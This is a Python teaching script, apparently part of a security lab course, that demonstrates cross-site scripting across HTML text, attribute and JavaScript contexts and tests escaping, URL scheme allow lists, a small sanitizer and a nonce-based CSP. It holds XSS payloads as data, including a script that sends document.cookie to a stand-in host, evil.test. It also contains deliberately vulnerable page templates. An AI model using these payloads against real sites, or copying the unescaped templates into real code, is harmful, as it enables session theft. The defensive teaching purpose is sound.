"""Lesson 9: cross-site scripting. What the browser parses out of a page with and without output encoding, and what a CSP decides.

There is no browser here. The page text is parsed with Python's own HTML parser, which builds the same kind of events a browser
builds (start tags and attributes), so "does a script element or an event attribute exist" is a real result and "would that
script run" is the rule of the CSP, written as a model. Asserts the output in three contexts (HTML text, quoted attribute,
JavaScript string), that html.escape stops the tag and the attribute break, that a javascript: link survives HTML escaping, that a
small allow list sanitizer keeps <b> and drops the rest, and that a nonce based CSP lets our script run and blocks the injected one.
"""

import html
import json
import secrets
import sys
from html.parser import HTMLParser
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from seclab import check, done, show  # noqa: E402


class Seen(HTMLParser):
    """Collects what the browser would build: elements, attributes and the text between them."""

    def __init__(self):
        super().__init__()
        self.tags: list[str] = []
        self.attrs: list[tuple[str, str, str | None]] = []
        self.text = ""

    def handle_starttag(self, tag, attrs):
        self.tags.append(tag)
        self.attrs += [(tag, k, v) for k, v in attrs]

    def handle_data(self, data):
        self.text += data


def parse(page: str) -> Seen:
    p = Seen()
    p.feed(page)
    return p


def has_script(page: str) -> bool:
    p = parse(page)
    return "script" in p.tags or any(k.startswith("on") for _, k, _ in p.attrs)


COMMENT = '<script>fetch("https://evil.test/?c="+document.cookie)</script>'

# ---- 1. stored XSS in HTML text ----
def page_naive(comment: str) -> str:
    return f"<html><body><h1>Reviews</h1><p>{comment}</p></body></html>"


def page_safe(comment: str) -> str:
    return f"<html><body><h1>Reviews</h1><p>{html.escape(comment)}</p></body></html>"


naive, safe = page_naive(COMMENT), page_safe(COMMENT)
show("naive page", naive)
show("escaped page", safe)
check("the naive page contains a script element that the author never wrote", "script" in parse(naive).tags)
check("the escaped page has no script element", "script" not in parse(safe).tags)
check("the escaped page still shows the comment as visible text, exactly as typed", COMMENT in parse(safe).text)
check("the characters < > & \" ' become &lt; &gt; &amp; &quot; &#x27;", html.escape("<>&\"'") == "&lt;&gt;&amp;&quot;&#x27;")

# ---- 2. attribute context: a quote ends the value ----
def input_naive(value: str) -> str:
    return f'<input name="q" value="{value}">'


def input_safe(value: str) -> str:
    return f'<input name="q" value="{html.escape(value)}">'


attack = '" onfocus="alert(1)" autofocus="'
show("naive input", input_naive(attack))
check("the quote in the value ends the attribute and onfocus becomes a real attribute", has_script(input_naive(attack)))
check("with escaping the same text stays inside value", not has_script(input_safe(attack)) and parse(input_safe(attack)).attrs[1][2] == attack)
check("html.escape is the wrong tool without quotes around the attribute: a space still ends it", has_script("<input value=" + html.escape("x onfocus=alert(1)") + ">"))

# ---- 3. a different context needs a different encoding: a value inside a <script> block ----
import json  # noqa: E402

value = "x'; alert(1); //"
js_naive = f"var name = '{value}';"
literal_end = js_naive.index("'", js_naive.index("'") + 1)
show("naive: value placed inside quotes in a script", js_naive)
check("the quote in the value closes the JavaScript string early, so alert(1) is code", js_naive[literal_end:].startswith("'; alert(1);"))
js_json = f"var name = {json.dumps(value)};"
check("json.dumps writes the whole value as one string literal, quotes and all", json.loads(js_json[len("var name = "):-1]) == value)
breakout = "</script><img src=x onerror=alert(1)>"
page_a = "<script>var v = " + json.dumps(breakout) + ";</script>"
page_b = "<script>var v = " + json.dumps(breakout).replace("<", "\\u003c") + ";</script>"
check("a value with </script> ends the block, and the HTML parser then sees an img with onerror", "img" in parse(page_a).tags and has_script(page_a))
check("writing < as the six characters \\u003c keeps the value inside the block (the parser sees no img)", "img" not in parse(page_b).tags)

# ---- 4. a link: escaping does not look at the scheme ----
link = "javascript:alert(document.cookie)"
tag = f'<a href="{html.escape(link)}">my site</a>'
check("html.escape leaves javascript:... untouched, so the link is still a script", parse(tag).attrs[0][2] == link)


def safe_url(u: str) -> bool:
    return urlparse(u.strip()).scheme.lower() in {"http", "https", ""}


check("an allow list of schemes (http, https, relative) refuses it", not safe_url(link) and safe_url("https://shop.test/") and safe_url("/orders"))
check("it also refuses the version with a space and capital letters in front", not safe_url("  JaVaScRiPt:alert(1)"))

# ---- 5. a tiny allow list sanitizer: keep <b> and <i>, drop everything else ----
class Clean(HTMLParser):
    KEEP = {"b", "i"}

    def __init__(self):
        super().__init__()
        self.out = ""

    def handle_starttag(self, tag, attrs):
        if tag in self.KEEP:
            self.out += f"<{tag}>"  # no attributes survive, so no onclick, no href

    def handle_endtag(self, tag):
        if tag in self.KEEP:
            self.out += f"</{tag}>"

    def handle_data(self, data):
        self.out += html.escape(data)


def sanitize(s: str) -> str:
    c = Clean()
    c.feed(s)
    return c.out


dirty = 'nice <b onclick="x()">shop</b> <img src=x onerror=alert(1)> <script>alert(2)</script>'
clean = sanitize(dirty)
show("sanitize()", clean)
check("bold survives without its attribute", "<b>shop</b>" in clean)
check("img and script tags are gone and no event attribute is left", not has_script(clean) and "<img" not in clean)
check("note: the TEXT inside the removed script is kept as plain text (alert(2)), which is why a real project uses a maintained sanitizer", "alert(2)" in clean)

# ---- 6. Content Security Policy: a second wall ----
def allows_inline(policy: str, nonce_on_tag: str | None) -> bool:
    directives = {p.split()[0]: p.split()[1:] for p in policy.split(";") if p.strip()}
    src = directives.get("script-src", directives.get("default-src", ["*"]))
    if "'unsafe-inline'" in src and not any(s.startswith("'nonce-") for s in src):
        return True
    return nonce_on_tag is not None and f"'nonce-{nonce_on_tag}'" in src


nonce = secrets.token_urlsafe(16)
policy = f"default-src 'self'; script-src 'self' 'nonce-{nonce}'; object-src 'none'"
show("Content-Security-Policy", policy)
check("our own inline script carries the nonce of this response and runs", allows_inline(policy, nonce))
check("an injected inline script has no nonce and is blocked", not allows_inline(policy, None))
check("an attacker who guesses a nonce from an old page is blocked, because it changes on every response", not allows_inline(policy, secrets.token_urlsafe(16)))
check("a policy with 'unsafe-inline' and no nonce lets the injected script run again", allows_inline("script-src 'self' 'unsafe-inline'", None))
check("a nonce is 22 characters (128 bits) from token_urlsafe(16)", len(nonce) == 22)
if "--write" in sys.argv:
    ROOT = Path(__file__).resolve().parents[4]
    OUT = ROOT / "site" / "src" / "components" / "labs" / "app-security" / "xss.json"
    bs = chr(92)
    contexts = {
        "html": (lambda x: f"<p>{x}</p>", lambda x: f"<p>{html.escape(x)}</p>", ["nice shop", COMMENT]),
        "attr": (lambda x: f'<input name="q" value="{x}">', lambda x: f'<input name="q" value="{html.escape(x)}">', ["pen", attack]),
        "js": (lambda x: "<script>var v = " + json.dumps(x) + ";</script>", lambda x: "<script>var v = " + json.dumps(x).replace("<", bs + "u003c") + ";</script>", ["pen", breakout]),
    }
    cases = []
    for ctx, (bad, good, payloads) in contexts.items():
        for pi, pay in enumerate(payloads):
            for enc, fn in (("none", bad), ("safe", good)):
                page = fn(pay)
                p = parse(page)
                handlers = [f"{t}[{k}]" for t, k, _ in p.attrs if k.startswith("on")]
                cases.append({"ctx": ctx, "payload": pay, "evil": pi == 1, "enc": enc, "html": page, "tags": p.tags, "handlers": handlers, "injected": (has_script(page) if ctx != "js" else ("img" in p.tags or bool(handlers))), "textHasPayload": pay in p.text})
    csp = {"off": True, "nonce": allows_inline(policy, None), "unsafe": allows_inline("script-src 'self' 'unsafe-inline'", None)}
    OUT.write_text(json.dumps({"cases": cases, "cspInlineRuns": csp}, indent=1), encoding="utf-8")
    print(f"wrote {OUT}")
done()
